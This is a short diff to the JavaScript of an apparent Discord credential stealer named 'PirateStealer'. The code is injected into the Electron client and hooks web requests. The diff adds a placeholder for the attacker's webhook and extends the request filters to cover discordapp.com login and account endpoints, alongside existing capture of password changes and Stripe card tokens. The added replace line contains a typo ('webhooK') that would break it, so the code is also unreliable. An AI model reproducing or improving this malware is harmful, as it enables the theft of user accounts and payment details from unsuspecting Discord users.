@@ -15,9 +15,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
 
 
-
+//try to put ur webhook
   var webhook = "%WEBHOOK_LINK%";
-  
+  webhook = webhooK.replace("discordapp", "discord")
   function FirstTime(){
       
       if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
@@ -333,7 +333,9 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
   const ChangePasswordFilter = {
       urls: [
           "https://discord.com/api/v*/users/@me",
+          "https://discordapp.com/api/v*/users/@me",
           "https://*.discord.com/api/v*/users/@me",
+          "https://discordapp.com/api/v*/auth/login",
           'https://discord.com/api/v*/auth/login',
           'https://*.discord.com/api/v*/auth/login',
           "https://api.stripe.com/v*/tokens"
